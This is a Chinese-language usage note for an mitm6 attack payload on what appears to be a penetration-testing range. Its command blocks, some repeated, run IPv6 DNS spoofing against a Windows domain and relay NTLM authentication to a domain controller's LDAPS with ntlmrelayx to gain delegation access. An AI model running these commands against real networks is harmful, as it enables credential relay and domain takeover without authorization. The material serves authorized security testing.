## 📦 载荷使用说明：mitm6_attack.sh

该载荷文件主要配合 **mitm6** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `mitm6` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
mitm6 -d corp.local
```

**配置示例 2**：
```bash
# 终端1: 启动 mitm6
mitm6 -d corp.local

# 终端2: 启动 ntlmrelayx
python3 ntlmrelayx.py -6 -t ldaps://DC01 \\
  --delegate-access --no-smb-server
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## mitm6 IPv6 DNS欺骗

### 启动 mitm6
```bash
mitm6 -d corp.local
```

### 配合 ntlmrelayx
```bash
# 终端1: 启动 mitm6
mitm6 -d corp.local

# 终端2: 启动 ntlmrelayx
python3 ntlmrelayx.py -6 -t ldaps://DC01 \\
  --delegate-access --no-smb-server
```

- 利用 Windows 默认优先使用 IPv6 的特性
- ✓ 可绕过 SMB 签名限制
- ⚠ 会影响网络，谨慎在生产环境使用